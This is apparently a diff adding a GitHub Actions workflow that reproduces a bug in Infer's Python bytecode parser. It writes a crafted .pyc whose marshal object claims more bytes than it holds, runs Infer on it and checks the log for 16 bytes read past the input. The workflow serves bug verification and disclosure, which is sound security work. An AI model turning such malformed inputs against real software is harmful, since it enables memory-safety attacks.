@@ -1,0 +1,90 @@
+name: Infer Python bytecode length validation
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    steps:
+      - name: Check out exact current Infer source
+        uses: actions/checkout@v4
+        with:
+          repository: facebook/infer
+          ref: cb4fcf8e1f571c02a669af978a6e69f3e2ddd062
+          path: infer-source
+          persist-credentials: false
+
+      - name: Download and verify official Infer v1.3.0 release
+        run: |
+          mkdir -p release
+          curl -fL --retry 5 \
+            https://github.com/facebook/infer/releases/download/v1.3.0/infer-linux-x86_64-v1.3.0.tar.xz \
+            -o release/infer-linux-x86_64-v1.3.0.tar.xz
+          echo '02be62ba931cb43e2d42bbf7abf4bd9a410cf8464cce5453934e25c90a825850  release/infer-linux-x86_64-v1.3.0.tar.xz' \
+            | sha256sum -c -
+          tar -xJf release/infer-linux-x86_64-v1.3.0.tar.xz -C release
+          release/infer-linux-x86_64-v1.3.0/bin/infer --version
+          echo 'a7cd58398ad1dab452e3b48c30558dcfea94ba3c468837b8944c5cbf59984041  infer-source/infer/src/python/FFI.ml' \
+            | sha256sum -c -
+
+      - name: Verify the parser consumes sixteen bytes past its input string
+        run: |
+          proof_dir=$(mktemp -d "$RUNNER_TEMP/infer-pyc.XXXXXX")
+          probe="$proof_dir/probe.pyc"
+
+          PROBE_PATH="$probe" python3 - <<'PY'
+          import os
+          from pathlib import Path
+
+          # A 16-byte pyc header followed by a marshal bytes object. The object
+          # declares 31 bytes but the marshal input contains only 15. Infer
+          # incorrectly gives PyMarshal the entire file size, authorizing the
+          # remaining 16 bytes beyond the OCaml string.
+          header = bytes((85, 13, 13, 10)) + bytes(12)
+          marshal_data = b"s" + (31).to_bytes(4, "little") + (b"A" * 15)
+          Path(os.environ["PROBE_PATH"]).write_bytes(header + marshal_data)
+          print("file_size=36")
+          print("marshal_input_size=20")
+          print("declared_object_size=31")
+          PY
+
+          set +e
+          release/infer-linux-x86_64-v1.3.0/bin/infer \
+            capture --dump-textual --pyc-file "$probe" \
+            >"$proof_dir/infer.log" 2>&1
+          infer_status=$?
+          set -e
+
+          LOG_PATH="$proof_dir/infer.log" python3 - <<'PY'
+          import ast
+          import os
+          from pathlib import Path
+
+          marker = "Failed to load code from object "
+          text = Path(os.environ["LOG_PATH"]).read_text(errors="replace")
+          candidate = None
+          for line in text.splitlines():
+              if marker in line:
+                  candidate = line.split(marker, 1)[1].strip()
+                  break
+          if candidate is None:
+              raise SystemExit("expected_invalid_code_object_error=absent")
+          value = ast.literal_eval(candidate)
+          if not isinstance(value, bytes):
+              raise SystemExit("decoded_object_type=unexpected")
+          if len(value) != 31 or value[:15] != b"A" * 15:
+              raise SystemExit("decoded_object_shape=unexpected")
+          print("decoded_object_type=bytes")
+          print(f"decoded_object_size={len(value)}")
+          print("controlled_input_bytes=15")
+          print(f"bytes_consumed_past_input={len(value) - 15}")
+          print("finding_reproduced=true")
+          PY
+
+          echo "infer_exit=$infer_status"
+          rm -f "$proof_dir/infer.log" "$probe"
